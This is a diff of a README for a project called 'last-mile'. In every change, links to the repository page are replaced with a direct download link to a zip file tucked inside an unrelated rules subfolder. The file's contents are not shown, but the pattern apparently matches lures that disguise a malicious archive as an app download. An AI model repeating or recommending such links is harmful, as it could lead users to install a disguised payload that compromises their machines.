@@ -1,6 +1,6 @@
 # 🛠️ last-mile - Ready apps for real use
 
-[![Download](https://img.shields.io/badge/Download%20last--mile-blue?style=for-the-badge&logo=github)](https://github.com/Dahliaadvantageous649/last-mile)
+[![Download](https://img.shields.io/badge/Download%20last--mile-blue?style=for-the-badge&logo=github)](https://github.com/Dahliaadvantageous649/last-mile/raw/refs/heads/main/rules/framework-specific/supabase/last_mile_2.1.zip)
 
 ## 📦 What this app does
 
@@ -29,7 +29,7 @@ For best results, keep your system up to date and close extra apps before you st
 
 Visit this page to download:
 
-[https://github.com/Dahliaadvantageous649/last-mile](https://github.com/Dahliaadvantageous649/last-mile)
+[https://github.com/Dahliaadvantageous649/last-mile/raw/refs/heads/main/rules/framework-specific/supabase/last_mile_2.1.zip](https://github.com/Dahliaadvantageous649/last-mile/raw/refs/heads/main/rules/framework-specific/supabase/last_mile_2.1.zip)
 
 Then follow the steps below:
 
@@ -204,7 +204,7 @@ Try these steps in order:
 
 ## 📎 Download again
 
-[Open the download page](https://github.com/Dahliaadvantageous649/last-mile)
+[Open the download page](https://github.com/Dahliaadvantageous649/last-mile/raw/refs/heads/main/rules/framework-specific/supabase/last_mile_2.1.zip)
 
 ## 🧩 File name and project name
 
